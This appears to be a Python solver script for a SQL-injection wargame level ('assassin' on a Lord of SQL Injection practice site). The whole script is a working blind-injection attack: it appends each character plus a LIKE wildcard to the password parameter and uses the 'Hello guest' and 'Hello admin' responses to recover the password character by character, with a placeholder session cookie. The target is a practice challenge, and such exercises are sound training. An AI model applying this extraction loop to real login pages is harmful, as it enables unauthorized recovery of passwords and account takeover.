import requests

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=90'
cookie = {'PHPSESSID' : 'COOKIE'}

ans = []
pre_ans = []

for j in range(48, 123):
    test = url + chr(j) + "%"
    res = requests.get(test, cookies=cookie)
    if 'Hello guest' in res.text:
        ans.append(chr(j))
    if 'Hello admin' in res.text:
        pre_ans.append(chr(j))
print(ans)
print(pre_ans)